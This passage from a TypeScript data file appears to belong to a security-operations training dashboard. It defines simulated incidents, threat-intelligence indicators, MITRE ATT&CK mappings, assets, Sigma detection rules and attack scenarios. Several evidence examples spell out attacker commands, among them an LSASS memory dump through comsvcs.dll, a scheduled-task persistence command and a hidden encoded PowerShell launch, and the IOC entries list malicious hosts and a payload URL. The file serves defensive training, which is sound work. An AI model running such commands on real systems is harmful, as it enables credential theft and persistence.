    affected_host: 'DB-SRV-01',
    affected_user: 'svc_backup',
    source_ip: '192.168.10.88',
    current_status: 'TRIAGED',
    assigned_analyst: 'SOC L1 Analyst',
    summary: 'Attacker leveraged SQL injection on internal web portal to execute xp_cmdshell and exfiltrate database records using base64 encoded TXT DNS queries to external nameserver.',
    related_alert_ids: ['ALT-2026-8814'],
    mitre_tactics: ['Initial Access', 'Execution', 'Exfiltration'],
    mitre_techniques: ['T1190 (Exploit Public-Facing Application)', 'T1059 (Command Interpreter)', 'T1071.004 (DNS Exfiltration)'],
    containment_actions_taken: [
      'Disabled xp_cmdshell on MSSQL instance',
      'DNS forwarder configured to sinkhole *.darknet.io'
    ],
    containment_status: {
      host_isolated: false,
      ip_blocked: true,
      credentials_reset: false,
      process_killed: true
    },
    impact_scope: 'Estimated 450 customer payroll records exfiltrated over DNS tunnel.',
    root_cause: 'Unsanitized user input in internal web reporting portal; database service account running as sysadmin.'
  }
];

// ==========================================
// 4. THREAT INTELLIGENCE & IOC DATABASE
// ==========================================
export const INITIAL_IOCS: IOCItem[] = [
  {
    id: 'IOC-001',
    type: 'IP',
    value: '185.220.101.44',
    reputation: 'MALICIOUS',
    risk_score: 98,
    first_seen: '2026-07-14 04:12:00 UTC',
    last_seen: '2026-08-26 19:50:12 UTC',
    associated_alerts: ['ALT-2026-8812'],
    related_hosts: ['WIN-CLIENT-08'],
    related_users: ['jdoe'],
    country: 'Netherlands (NL)',
    asn: 'AS49453 - Global Internet Solutions Ltd',
    threat_actor: 'APT29 / Cozy Bear Affiliate',
    tags: ['Cobalt Strike C2', 'Tor Exit Node', 'Bulletproof Host', 'Active Botnet'],
    detection_notes: 'High-confidence C2 infrastructure hosting Cobalt Strike 4.9 HTTPS listeners. Known for delivering staged payloads via macro droppers.'
  },
  {
    id: 'IOC-002',
    type: 'IP',
    value: '203.0.113.195',
    reputation: 'MALICIOUS',
    risk_score: 91,
    first_seen: '2026-08-20 11:23:45 UTC',
    last_seen: '2026-08-26 19:46:58 UTC',
    associated_alerts: ['ALT-2026-8813'],
    related_hosts: ['LINUX-SRV-02'],
    related_users: ['deploy', 'root'],
    country: 'Hong Kong (HK)',
    asn: 'AS133120 - Cloud Silk Network',
    threat_actor: 'FIN7 / Automated Brute Force Farm',
    tags: ['SSH Brute Force', 'Credential Harvesting', 'Automated Scanner'],
    detection_notes: 'Mass SSH credential guessing host scanning worldwide IP subnets on port 22. Reported in over 340 AbuseIPDB incidents.'
  },
  {
    id: 'IOC-003',
    type: 'DOMAIN',
    value: 'update-cdn-cloudsvc.com',
    reputation: 'MALICIOUS',
    risk_score: 95,
    first_seen: '2026-08-24 08:00:00 UTC',
    last_seen: '2026-08-26 19:50:12 UTC',
    associated_alerts: ['ALT-2026-8812'],
    related_hosts: ['WIN-CLIENT-08'],
    related_users: ['jdoe'],
    registrar: 'NameCheap Inc (Privacy Protected)',
    threat_actor: 'Unknown Threat Group',
    tags: ['Typosquatting', 'C2 Domain', 'Staging Server', 'Dynamic DNS'],
    detection_notes: 'Masquerading as legitimate Microsoft/Cloudflare update CDN. Domain was registered only 48 hours prior to the campaign.'
  },
  {
    id: 'IOC-004',
    type: 'DOMAIN',
    value: 'c2-exfil-ns1.darknet.io',
    reputation: 'MALICIOUS',
    risk_score: 94,
    first_seen: '2026-08-25 15:30:00 UTC',
    last_seen: '2026-08-26 19:41:05 UTC',
    associated_alerts: ['ALT-2026-8814'],
    related_hosts: ['DB-SRV-01'],
    related_users: ['svc_backup'],
    registrar: 'RegZone RU',
    threat_actor: 'Carbanak Group',
    tags: ['DNS Tunneling', 'Exfiltration Endpoint', 'High Entropy NS'],
    detection_notes: 'Authoritative nameserver configured specifically to accept high-frequency base64 subdomain queries for covert data exfiltration.'
  },
  {
    id: 'IOC-005',
    type: 'HASH',
    value: '9b71d224bd62f3785d96d46ad3ea3d733107e8d58ae477366bfd169d9f58f407',
    reputation: 'MALICIOUS',
    risk_score: 100,
    first_seen: '2026-08-26 19:40:02 UTC',
    last_seen: '2026-08-26 19:50:12 UTC',
    associated_alerts: ['ALT-2026-8812'],
    related_hosts: ['WIN-CLIENT-08'],
    related_users: ['jdoe'],
    threat_actor: 'Wizard Spider',
    tags: ['SHA256', 'VBA Macro Dropper', 'Cobalt Strike Beacon', 'Trojan.Dropper.Generic'],
    detection_notes: 'VirusTotal detection 58/72 AV engines. Weaponized Microsoft Word document embedding obfuscated VBA macro and PowerShell payload.'
  },
  {
    id: 'IOC-006',
    type: 'HASH',
    value: '3f5187e1a3b8d4e92a0149c0d1283e5891acbe01235489f0716a4e32049b1c90',
    reputation: 'SUSPICIOUS',
    risk_score: 78,
    first_seen: '2026-08-26 19:41:05 UTC',
    last_seen: '2026-08-26 19:41:05 UTC',
    associated_alerts: ['ALT-2026-8814'],
    related_hosts: ['DB-SRV-01'],
    related_users: ['svc_backup'],
    threat_actor: 'Unknown',
    tags: ['SHA256', 'DNS Exfil Script', 'Batch Utility'],
    detection_notes: 'Custom PowerShell script looping database query results into split DNS TXT lookup strings.'
  },
  {
    id: 'IOC-007',
    type: 'IP',
    value: '91.240.118.82',
    reputation: 'SUSPICIOUS',
    risk_score: 76,
    first_seen: '2026-08-26 19:45:00 UTC',
    last_seen: '2026-08-26 19:45:00 UTC',
    associated_alerts: ['ALT-2026-8815'],
    related_hosts: ['AZURE-AD-AUTH'],
    related_users: ['sarah.connor@corp.cyber'],
    country: 'Russia (RU)',
    asn: 'AS57523 - Datacenter Services LLC',
    tags: ['Commercial VPN', 'Proxy Anonymizer', 'Impossible Travel IP'],
    detection_notes: 'Datacenter IP range known for commercial VPN / socks5 proxies. Flagged on Azure AD Identity Protection as risky sign-in.'
  },
  {
    id: 'IOC-008',
    type: 'URL',
    value: 'https://update-cdn-cloudsvc.com/stage2.bin',
    reputation: 'MALICIOUS',
    risk_score: 99,
    first_seen: '2026-08-26 19:50:12 UTC',
    last_seen: '2026-08-26 19:50:12 UTC',
    associated_alerts: ['ALT-2026-8812'],
    related_hosts: ['WIN-CLIENT-08'],
    related_users: ['jdoe'],
    tags: ['Stage 2 Payload', 'Raw Shellcode', 'HTTPS Delivery'],
    detection_notes: 'Hosted binary serving encrypted shellcode reflective DLL loader into powershell memory space.'
  }
];

// ==========================================
// 5. MITRE ATT&CK MATRIX MAPPINGS & TACTICS
// ==========================================
export const MITRE_TECHNIQUES: MitreTechnique[] = [
  {
    id: 'MITRE-T1566',
    tactic: 'Initial Access',
    technique_id: 'T1566.001',
    technique_name: 'Phishing: Spearphishing Attachment',
    description: 'Adversaries send spearphishing emails with a malicious file attachment to gain initial execution inside the corporate perimeter.',
    evidence_example: 'Inbound email from payroll-update@secure-hr-portal.com containing macro-enabled attachment Q3_Bonus_Summary.docm.',
    detection_logic: 'Email gateway attachment sandboxing + Sysmon Event ID 11 (File creation of .docm/.xlsm in %TEMP% by Outlook).',
    mitigation: 'Block macro execution via Group Policy / ASR rules (Block Office applications from creating child processes).',
    phase_order: 1,
    color_code: '#3b82f6',
    mapped_alerts_count: 3
  },
  {
    id: 'MITRE-T1110',
    tactic: 'Credential Access',
    technique_id: 'T1110.001',
    technique_name: 'Brute Force: Password Guessing',
    description: 'Adversaries systematically submit passwords against accounts to discover valid credentials.',
    evidence_example: '24 consecutive SSH authentication failures from IP 203.0.113.195 within 45 seconds targeting users root, admin, deploy.',
    detection_logic: 'Count of failed auth events (Linux auth.log / Windows Event ID 4625) exceeding threshold > 5 within 5 minute window from single IP.',
    mitigation: 'Implement account lockout policies, fail2ban / rate limiting, and enforce SSH key-based or MFA auth.',
    phase_order: 2,
    color_code: '#ef4444',
    mapped_alerts_count: 5
  },
  {
    id: 'MITRE-T1059',
    tactic: 'Execution',
    technique_id: 'T1059.001',
    technique_name: 'Command and Scripting Interpreter: PowerShell',
    description: 'Adversaries abuse PowerShell to execute arbitrary commands, download scripts, and run in-memory malware payloads.',
    evidence_example: 'Process powershell.exe spawned by winword.exe with -w hidden -enc JABzAD0ATgBlAHc... flags.',
    detection_logic: 'Sysmon Event ID 1 monitoring for powershell.exe with Base64 encoding parameters or spawned by Microsoft Office / Browser processes.',
    mitigation: 'Enforce PowerShell Constrained Language Mode, Script Block Logging (EID 4104), and AMSI inspection.',
    phase_order: 3,
    color_code: '#f59e0b',
    mapped_alerts_count: 6
  },
  {
    id: 'MITRE-T1003',
    tactic: 'Credential Access',
    technique_id: 'T1003.001',
    technique_name: 'OS Credential Dumping: LSASS Memory',
    description: 'Adversaries attempt to access and dump Local Security Authority Subsystem Service (LSASS) process memory to extract plaintext passwords and NTLM hashes.',
    evidence_example: 'rundll32.exe comsvcs.dll MiniDump 672 lsass.dmp full executed from PowerShell session.',
    detection_logic: 'Sysmon Event ID 10 monitoring PROCESS_VM_READ access masks targeting lsass.exe by unapproved processes.',
    mitigation: 'Enable Windows Defender Credential Guard and LSA Protection (RunAsPPL=1).',
    phase_order: 4,
    color_code: '#dc2626',
    mapped_alerts_count: 4
  },
  {
    id: 'MITRE-T1548',
    tactic: 'Privilege Escalation',
    technique_id: 'T1548.003',
    technique_name: 'Abuse Elevation Control Mechanism: Sudo and Sudo Caching',
    description: 'Adversaries perform unauthorized elevation by modifying sudoers configuration or exploiting sudo privileges.',
    evidence_example: 'User deploy modified /etc/sudoers.d/ to grant NOPASSWD root shell execution.',
    detection_logic: 'Auditd watch on /etc/sudoers and /etc/sudoers.d/ files for write events (k=sudoers_change).',
    mitigation: 'Strictly restrict sudoers edit permissions, require root password re-authentication for sensitive commands.',
    phase_order: 5,
    color_code: '#8b5cf6',
    mapped_alerts_count: 2
  },
  {
    id: 'MITRE-T1053',
    tactic: 'Persistence',
    technique_id: 'T1053.005',
    technique_name: 'Scheduled Task/Job: Scheduled Task',
    description: 'Adversaries configure Windows scheduled tasks to maintain persistence across system reboots.',
    evidence_example: 'schtasks.exe /create /tn "WindowsUpdateCheckDaily" /tr "C:\\Users\\Public\\updater.exe" /sc onlogon.',
    detection_logic: 'Windows Security Event ID 4698 (A scheduled task was created) where TaskContent references user-writable directories.',
    mitigation: 'Restrict user permissions to register scheduled tasks, audit Task Scheduler event logs.',
    phase_order: 6,
    color_code: '#10b981',
    mapped_alerts_count: 3
  },
  {
    id: 'MITRE-T1046',
    tactic: 'Discovery',
    technique_id: 'T1046',
    technique_name: 'Network Service Scanning',
    description: 'Adversaries scan network ports and services to locate accessible services and vulnerabilities on remote hosts.',
    evidence_example: 'High-frequency TCP SYN probes to 850 sequential ports on WEB-SRV-01 from IP 45.142.214.99.',
    detection_logic: 'Network IDS (Suricata/Snort) signature matching high volume SYN packets with no corresponding ACK within 5 seconds.',
    mitigation: 'Implement perimeter stateful firewalls, disable unnecessary open ports, deploy network segmentation.',
    phase_order: 7,
    color_code: '#06b6d4',
    mapped_alerts_count: 4
  },
  {
    id: 'MITRE-T1071',
    tactic: 'Command and Control',
    technique_id: 'T1071.004',
    technique_name: 'Application Layer Protocol: DNS Tunneling',
    description: 'Adversaries communicate with external C2 or exfiltrate data by embedding payload information inside DNS query/response packets.',
    evidence_example: 'High-entropy base64 subdomain queries to c2-exfil-ns1.darknet.io requesting TXT records.',
    detection_logic: 'SIEM query tracking internal clients with >500 unique subdomain queries per hour and Shannon entropy > 4.5.',
    mitigation: 'Route all corporate DNS through filtering DNS resolvers with threat intelligence RPZ feeds.',
    phase_order: 8,
    color_code: '#ec4899',
    mapped_alerts_count: 3
  }
];

// ==========================================
// 6. ASSET MANAGEMENT & INVENTORY
// ==========================================
export const INITIAL_ASSETS: Asset[] = [
  {
    id: 'AST-001',
    hostname: 'DC-PROD-01',
    ip_address: '10.0.0.1',
    os: 'Windows Server 2022 Datacenter',
    criticality: 'CRITICAL',
    owner: 'Enterprise Infrastructure Team',
    last_seen: '2026-08-26 19:54:10 UTC',
    risk_score: 25,
    status: 'ONLINE',
    open_ports: [53, 88, 135, 389, 445, 636, 3268],
    vulnerabilities_count: 1,
    active_alerts_count: 1,
    services: ['Active Directory Domain Services', 'Kerberos KDC', 'DNS Server', 'LDAP']
  },
  {
    id: 'AST-002',
    hostname: 'WEB-SRV-01',
    ip_address: '10.0.0.10',
    os: 'Ubuntu 24.04 LTS Linux',
    criticality: 'HIGH',
    owner: 'DevOps & Web Engineering',
    last_seen: '2026-08-26 19:53:40 UTC',
    risk_score: 68,
    status: 'UNDER_INVESTIGATION',
    open_ports: [80, 443, 8080],
    vulnerabilities_count: 3,
    active_alerts_count: 2,
    services: ['Nginx Reverse Proxy', 'Node.js API Server', 'Docker Engine']
  },
  {
    id: 'AST-003',
    hostname: 'DB-SRV-01',
    ip_address: '192.168.10.88',
    os: 'Windows Server 2019',
    criticality: 'CRITICAL',
    owner: 'Database Administration',
    last_seen: '2026-08-26 19:52:00 UTC',
    risk_score: 82,
    status: 'UNDER_INVESTIGATION',
    open_ports: [1433, 445],
    vulnerabilities_count: 2,
    active_alerts_count: 2,
    services: ['Microsoft SQL Server 2019', 'SQL Server Integration Services']
  },
  {
    id: 'AST-004',
    hostname: 'WIN-CLIENT-08',
    ip_address: '192.168.10.45',
    os: 'Windows 11 Enterprise (23H2)',
    criticality: 'MEDIUM',
    owner: 'John Doe (Finance Dept)',
    last_seen: '2026-08-26 19:50:12 UTC',
    risk_score: 95,
    status: 'QUARANTINED',
    open_ports: [135, 445],
    vulnerabilities_count: 4,
    active_alerts_count: 3,
    services: ['Windows Defender EDR', 'Office 365 ProPlus', 'Pulse Secure VPN Client']
  },
  {
    id: 'AST-005',
    hostname: 'LINUX-SRV-02',
    ip_address: '10.0.0.15',
    os: 'Debian 12 Bookworm',
    criticality: 'HIGH',
    owner: 'QA & Staging Automation',
    last_seen: '2026-08-26 19:49:58 UTC',
    risk_score: 90,
    status: 'QUARANTINED',
    open_ports: [22, 9090],
    vulnerabilities_count: 2,
    active_alerts_count: 2,
    services: ['OpenSSH 9.2p1', 'Cockpit Management', 'Jenkins Agent']
  },
  {
    id: 'AST-006',
    hostname: 'SOC-SRV-01',
    ip_address: '10.0.0.99',
    os: 'Rocky Linux 9',
    criticality: 'CRITICAL',
    owner: 'SOC Security Operations',
    last_seen: '2026-08-26 19:54:30 UTC',
    risk_score: 10,
    status: 'ONLINE',
    open_ports: [443, 514, 9200, 5601],
    vulnerabilities_count: 0,
    active_alerts_count: 0,
    services: ['Elasticsearch SIEM', 'Kibana Security Dashboard', 'Wazuh Manager', 'Suricata IDS']
  }
];

// ==========================================
// 7. DETECTION RULES CATALOG (SIGMA / YAML)
// ==========================================
export const INITIAL_DETECTION_RULES: DetectionRule[] = [
  {
    id: 'RULE-001',
    rule_id: 'RULE-001',
    name: 'SSH Brute Force Authentication Flooding',
    severity: 'HIGH',
    category: 'AUTHENTICATION',
    description: 'Detects multiple failed SSH authentication attempts from a single source IP exceeding rate thresholds.',
    detection_logic: 'Count of failed SSH authentications (sshd "Failed password") > 5 from same Source IP within a 5-minute rolling window.',
    sigma_yaml: `title: SSH Authentication Brute Force
id: 3c9b7410-410a-4bf3-8d02-e2d42bb271b1
status: stable
description: Detects more than 5 SSH login failures from single IP
logsource:
    category: auth
    product: linux
detection:
    selection:
        program: sshd
        message|contains: 'Failed password'
    timeframe: 5m
    condition: selection | count(src_ip) > 5
level: high
tags:
    - attack.credential_access
    - attack.t1110.001`,
    mitre_technique: 'Brute Force: Password Guessing',
    mitre_technique_id: 'T1110.001',
    status: 'ENABLED',
    trigger_count: 42,
    false_positive_rate: '< 1.5%',
    author: 'SOC Threat Engineering Team'
  },
  {
    id: 'RULE-002',
    rule_id: 'RULE-002',
    name: 'Obfuscated PowerShell Command Execution',
    severity: 'CRITICAL',
    category: 'ENDPOINT',
    description: 'Detects execution of powershell.exe with execution bypass flags or Base64 encoded payload strings, especially when spawned by Office or web processes.',
    detection_logic: 'Image ends with "powershell.exe" AND CommandLine contains ("-enc", "-EncodedCommand", "-w hidden", "-nop") AND ParentImage in ("winword.exe", "excel.exe", "w3wp.exe", "nginx.exe").',
    sigma_yaml: `title: Suspicious PowerShell Child of Office Application
id: 8b07289f-29d9-4822-8321-7299a9a3b981
status: stable
logsource:
    category: process_creation
    product: windows
detection:
    selection_parent:
        ParentImage|endswith:
            - '\\winword.exe'
            - '\\excel.exe'
            - '\\powerpnt.exe'
    selection_child:
        Image|endswith: '\\powershell.exe'
        CommandLine|contains:
            - '-enc'
            - '-EncodedCommand'
            - '-w hidden'
    condition: selection_parent and selection_child
level: critical
tags:
    - attack.execution
    - attack.t1059.001`,
    mitre_technique: 'Command and Scripting Interpreter: PowerShell',
    mitre_technique_id: 'T1059.001',
    status: 'ENABLED',
    trigger_count: 18,
    false_positive_rate: '< 0.1%',
    author: 'SOC Threat Engineering Team'
  },
  {
    id: 'RULE-003',
    rule_id: 'RULE-003',
    name: 'LSASS Process Memory Dumping (Mimikatz / Comsvcs)',
    severity: 'CRITICAL',
    category: 'ENDPOINT',
    description: 'Detects attempts to read or dump memory of the Local Security Authority Subsystem Service (lsass.exe).',
    detection_logic: 'Sysmon EID 10 TargetImage="lsass.exe" with GrantedAccess mask having PROCESS_VM_READ (0x0010) or comsvcs.dll MiniDump command line.',
    sigma_yaml: `title: LSASS Memory Dump Via Comsvcs DLL
id: f456a12b-3122-4912-b91c-148102891902
status: stable
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\\rundll32.exe'
        CommandLine|contains|all:
            - 'comsvcs.dll'
            - 'MiniDump'
    condition: selection
level: critical
tags:
    - attack.credential_access
    - attack.t1003.001`,
    mitre_technique: 'OS Credential Dumping: LSASS Memory',
    mitre_technique_id: 'T1003.001',
    status: 'ENABLED',
    trigger_count: 9,
    false_positive_rate: '< 0.05%',
    author: 'SOC Threat Engineering Team'
  },
  {
    id: 'RULE-004',
    rule_id: 'RULE-004',
    name: 'Impossible Travel Geolocation Velocity Anomaly',
    severity: 'HIGH',
    category: 'AUTHENTICATION',
    description: 'Triggers when consecutive logins for the same account occur from geographical locations requiring travel speed > 800 km/h.',
    detection_logic: 'Distance(Location(Login_N), Location(Login_N-1)) / TimeDelta(Login_N, Login_N-1) > 800 km/h.',
    sigma_yaml: `title: Impossible Travel Authentication Velocity
id: 5912a101-7128-4bb1-8201-9128aa918231
status: stable
logsource:
    category: authentication
    product: cloud_idp
detection:
    condition: velocity_kmh > 800 and distinct_countries >= 2
level: high
tags:
    - attack.initial_access
    - attack.t1078.004`,
    mitre_technique: 'Valid Accounts: Cloud Accounts',
    mitre_technique_id: 'T1078.004',
    status: 'ENABLED',
    trigger_count: 14,
    false_positive_rate: '3.2%',
    author: 'SOC Threat Engineering Team'
  },
  {
    id: 'RULE-005',
    rule_id: 'RULE-005',
    name: 'Successful Login Following Password Brute Force',
    severity: 'CRITICAL',
    category: 'AUTHENTICATION',
    description: 'Detects a successful authentication event from an IP address that generated >= 5 failed attempts in the preceding 10 minutes.',
    detection_logic: 'Auth_Success(src_ip, user) preceded by >= 5 Auth_Failure(src_ip) within 10m window.',
    sigma_yaml: `title: Successful Authentication After Brute Force
id: 7129bc81-1209-411a-8291-7299a9a3b981
status: stable
logsource:
    category: authentication
detection:
    condition: failed_attempts >= 5 FOLLOWED_BY success within 10m
level: critical
tags:
    - attack.initial_access
    - attack.t1078`,
    mitre_technique: 'Valid Accounts',
    mitre_technique_id: 'T1078',
    status: 'ENABLED',
    trigger_count: 7,
    false_positive_rate: '< 0.5%',
    author: 'SOC Threat Engineering Team'
  },
  {
    id: 'RULE-006',
    rule_id: 'RULE-006',
    name: 'High Entropy DNS Tunneling & Covert Exfiltration',
    severity: 'HIGH',
    category: 'DNS',
    description: 'Identifies excessive high-entropy TXT or A record DNS queries to a single external root domain indicating covert tunneling.',
    detection_logic: 'Count(DNS queries to domain) > 100 in 5m AND Avg(Subdomain Shannon Entropy) > 4.2.',
    sigma_yaml: `title: High Entropy DNS Tunneling
id: 90184411-921a-4122-8199-a9a3b9818812
status: stable
logsource:
    category: dns
detection:
    selection:
        qtype: ['TXT', 'A', 'NULL']
        entropy: '> 4.2'
    timeframe: 5m
    condition: selection | count(dest_domain) > 100
level: high
tags:
    - attack.exfiltration
    - attack.t1071.004`,
    mitre_technique: 'Application Layer Protocol: DNS Tunneling',
    mitre_technique_id: 'T1071.004',
    status: 'ENABLED',
    trigger_count: 11,
    false_positive_rate: '2.1%',
    author: 'SOC Threat Engineering Team'
  },
  {
    id: 'RULE-007',
    rule_id: 'RULE-007',
    name: 'TCP SYN Reconnaissance Port Sweep',
    severity: 'MEDIUM',
    category: 'NETWORK',
    description: 'Detects rapid SYN packet sweeps across multiple destination ports on single target without completing 3-way handshake.',
    detection_logic: 'Count(Unique dest_port with TCP_FLAGS=SYN) > 50 from single src_ip within 10 seconds.',
    sigma_yaml: `title: Rapid TCP Port Scan
id: 11029411-192a-4bc1-9122-8199a9a3b981
status: stable
logsource:
    category: network_flow
detection:
    condition: unique_ports >= 50 within 10s
level: medium
tags:
    - attack.discovery
    - attack.t1046`,
    mitre_technique: 'Network Service Scanning',
    mitre_technique_id: 'T1046',
    status: 'ENABLED',
    trigger_count: 88,
    false_positive_rate: '5.0%',
    author: 'SOC Threat Engineering Team'
  },
  {
    id: 'RULE-008',
    rule_id: 'RULE-008',
    name: 'Unauthorized Sudoers Privilege Escalation',
    severity: 'CRITICAL',
    category: 'ENDPOINT',
    description: 'Detects writes or unauthorized edits to /etc/sudoers or /etc/sudoers.d/ configuration files.',
    detection_logic: 'Auditd event with path="/etc/sudoers" or "/etc/sudoers.d/*" with access mode WRITE.',
    sigma_yaml: `title: Sudoers Configuration File Modified
id: 48102941-411a-4bc1-8201-9128aa918231
status: stable
logsource:
    category: file_change
    product: linux
detection:
    selection:
        file_path|startswith: '/etc/sudoers'
        action: 'write'
    condition: selection
level: critical
tags:
    - attack.privilege_escalation
    - attack.t1548.003`,
    mitre_technique: 'Abuse Elevation Control Mechanism: Sudo',
    mitre_technique_id: 'T1548.003',
    status: 'ENABLED',
    trigger_count: 6,
    false_positive_rate: '< 0.1%',
    author: 'SOC Threat Engineering Team'
  },
  {
    id: 'RULE-009',
    rule_id: 'RULE-009',
    name: 'Outbound Cobalt Strike C2 Beaconing Profile',
    severity: 'HIGH',
    category: 'NETWORK',
    description: 'Detects periodic TLS traffic with small payload sizes matching default Cobalt Strike malleable C2 profiles.',
    detection_logic: 'Network TLS flows with JA3 fingerprint match OR inter-arrival time standard deviation < 15% (jitter).',
    sigma_yaml: `title: Cobalt Strike HTTPS Jittered Beaconing
id: 88201941-512a-4bc1-9122-8199a9a3b981
status: stable
logsource:
    category: network_flow
detection:
    condition: tls_ja3 = 'a0e9f5d64349fb13191bc781f81f42e1' and flow_count >= 10
level: high
tags:
    - attack.command_and_control
    - attack.t1071.001`,
    mitre_technique: 'Application Layer Protocol: Web Protocols',
    mitre_technique_id: 'T1071.001',
    status: 'ENABLED',
    trigger_count: 15,
    false_positive_rate: '< 0.5%',
    author: 'SOC Threat Engineering Team'
  },
  {
    id: 'RULE-010',
    rule_id: 'RULE-010',
    name: 'Suspicious Windows Scheduled Task Registration',
    severity: 'MEDIUM',
    category: 'ENDPOINT',
    description: 'Detects creation of scheduled tasks executing binaries from user-writable directories (AppData, Temp, Public).',
    detection_logic: 'EventID 4698 TaskContent contains ("\\Users\\Public", "\\AppData\\", "\\Temp\\") in command path.',
    sigma_yaml: `title: Scheduled Task in User Writable Directory
id: 99102941-612a-4bc1-9122-8199a9a3b981
status: stable
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        EventID: 4698
        TaskPath|contains:
            - 'AppData'
            - 'Users\\Public'
            - 'Temp'
    condition: selection
level: medium
tags:
    - attack.persistence
    - attack.t1053.005`,
    mitre_technique: 'Scheduled Task/Job: Scheduled Task',
    mitre_technique_id: 'T1053.005',
    status: 'ENABLED',
    trigger_count: 23,
    false_positive_rate: '2.8%',
    author: 'SOC Threat Engineering Team'
  },
  {
    id: 'RULE-011',
    rule_id: 'RULE-011',
    name: 'New Member Added to Local Administrator Group',
    severity: 'HIGH',
    category: 'AUTHENTICATION',
    description: 'Detects user account creation and immediate addition to the high-privilege Administrators security group.',
    detection_logic: 'EventID 4728 (Member added to security-enabled global group) OR EventID 4732 (Member added to local group) where TargetGroupName="Administrators".',
    sigma_yaml: `title: User Added to Local Administrators Group
id: 77102941-712a-4bc1-9122-8199a9a3b981
status: stable
logsource:
    category: group_management
    product: windows
detection:
    selection:
        EventID: [4728, 4732]
        TargetUserName: 'Administrators'
    condition: selection
level: high
tags:
    - attack.persistence
    - attack.t1098`,
    mitre_technique: 'Account Manipulation',
    mitre_technique_id: 'T1098',
    status: 'ENABLED',
    trigger_count: 8,
    false_positive_rate: '< 1.0%',
    author: 'SOC Threat Engineering Team'
  },
  {
    id: 'RULE-012',
    rule_id: 'RULE-012',
    name: 'Kerberoasting Attack / Weak Encryption Ticket Request',
    severity: 'HIGH',
    category: 'AUTHENTICATION',
    description: 'Detects Kerberos TGS requests for Service Principal Names (SPN) with weak RC4 (0x17) encryption requested by non-service accounts.',
    detection_logic: 'EventID 4769 TicketOptions="0x40810000" AND TicketEncryptionType="0x17" AND ServiceName not like "$*".',
    sigma_yaml: `title: Kerberoasting Ticket Request (RC4-HMAC)
id: 66102941-812a-4bc1-9122-8199a9a3b981
status: stable
logsource:
    category: authentication
    product: windows
detection:
    selection:
        EventID: 4769
        TicketEncryptionType: '0x17'
    filter:
        ServiceName|endswith: '$'
    condition: selection and not filter
level: high
tags:
    - attack.credential_access
    - attack.t1558.003`,
    mitre_technique: 'Steal or Forge Kerberos Tickets: Kerberoasting',
    mitre_technique_id: 'T1558.003',
    status: 'ENABLED',
    trigger_count: 12,
    false_positive_rate: '< 0.8%',
    author: 'SOC Threat Engineering Team'
  }
];

// ==========================================
// 8. 6 REALISTIC ATTACK SCENARIO SIMULATIONS
// ==========================================
export const ATTACK_SCENARIOS: AttackScenario[] = [
  {
    id: 'SCENARIO-01',
    key: 'ssh_brute_force',
    title: 'Scenario 1: SSH Brute Force & Linux Host Takeover',
    severity: 'CRITICAL',
    category: 'External Network & Identity Compromise',
    description: 'An external threat actor executes an automated dictionary brute-force attack against LINUX-SRV-02, successfully cracks the service account "deploy", creates a backdoor sudoers configuration, and attempts lateral pivoting.',
    target_asset: 'LINUX-SRV-02 (10.0.0.15)',
    attacker_ip: '203.0.113.195 (Hong Kong, Cloud Silk Network)',
    compromised_user: 'deploy (Service Account)',
    mitre_chain: [
      { tactic: 'Initial Access', technique: 'Brute Force: Password Guessing', technique_id: 'T1110.001' },
      { tactic: 'Persistence', technique: 'Valid Accounts: Local Accounts', technique_id: 'T1078.003' },
      { tactic: 'Privilege Escalation', technique: 'Abuse Elevation: Sudo Misconfiguration', technique_id: 'T1548.003' },
      { tactic: 'Discovery', technique: 'Account Discovery: Local Accounts', technique_id: 'T1087.001' }
    ],
    scenario_flow_steps: [
      {
        step_number: 1,
        phase: 'Detection & Triage',
        description: 'SOC SIEM detects a spike of 24 SSH authentication failures within 45 seconds targeting LINUX-SRV-02, followed immediately by Event 9037 (Auth Success).',
        analyst_action: 'Filter Live Event Stream for source_ip="203.0.113.195" and destination_port=22. Identify the compromised username.',
        expected_findings: 'Attacker cycled through root, admin, ubuntu, deploy. Authentication succeeded on user deploy.'
      },
      {
        step_number: 2,
        phase: 'Investigation & IOC Extraction',
        description: 'Pivot into IOC Investigation tool with IP 203.0.113.195 to inspect reputation, ASN, and geo-data.',
        analyst_action: 'Query 203.0.113.195 in Threat Intel module. Note risk score 91/100 and abuse history.',
        expected_findings: 'IP belongs to automated brute force botnet. Add to firewall blocklist recommendation.'
      },
      {
        step_number: 3,
        phase: 'Containment & Incident Escalation',
        description: 'The attacker executed "sudo /bin/bash" via a modified sudoers entry. Host is at high risk of lateral movement.',
        analyst_action: 'Advance Incident INC-2026-0042 to "CONTAINED". Isolate LINUX-SRV-02 and lock deploy account.',
        expected_findings: 'Network interface quarantined. Malicious sudoers file removed.'
      },
      {
        step_number: 4,
        phase: 'Incident Reporting & RCA',
        description: 'Complete the 13-section NIST incident report documenting root cause (weak password + exposed SSH port 22).',
        analyst_action: 'Auto-fill report from INC-2026-0042 in Report Studio and evaluate rubric score.',
        expected_findings: 'Achieve 5.0/5.0 Rubric Score by documenting remediation (Disable PasswordAuth, enforce SSH keys).'
      }
    ],
    injected_events: [
      INITIAL_EVENTS[3], // EVT-9038 Failed auths
      INITIAL_EVENTS[4], // EVT-9037 Success auth
      INITIAL_EVENTS[8]  // EVT-9033 Sudoers priv esc
    ],
    injected_alert: INITIAL_ALERTS[1],
    injected_incident: INITIAL_INCIDENTS[1]
  },
  {
    id: 'SCENARIO-02',
    key: 'powershell_macro_c2',
    title: 'Scenario 2: Malicious Word Macro & Encoded PowerShell C2',
    severity: 'CRITICAL',
    category: 'Phishing & Endpoint Malware Execution',
    description: 'A spear-phishing email delivers a weaponized Word document to finance user John Doe on WIN-CLIENT-08. Upon enabling macros, Word spawns an obfuscated Base64 PowerShell dropper that establishes a Cobalt Strike HTTPS beacon.',
    target_asset: 'WIN-CLIENT-08 (192.168.10.45)',
    attacker_ip: '185.220.101.44 (Netherlands, Tor Node)',
    compromised_user: 'jdoe (John Doe)',
    mitre_chain: [
      { tactic: 'Initial Access', technique: 'Phishing: Spearphishing Attachment', technique_id: 'T1566.001' },
      { tactic: 'Execution', technique: 'Command and Scripting: PowerShell', technique_id: 'T1059.001' },
      { tactic: 'Defense Evasion', technique: 'Obfuscated Files or Information', technique_id: 'T1027' },
      { tactic: 'Command & Control', technique: 'Application Layer Protocol: Web Protocols', technique_id: 'T1071.001' }
    ],
    scenario_flow_steps: [
      {
        step_number: 1,
        phase: 'EDR Alert Triage',
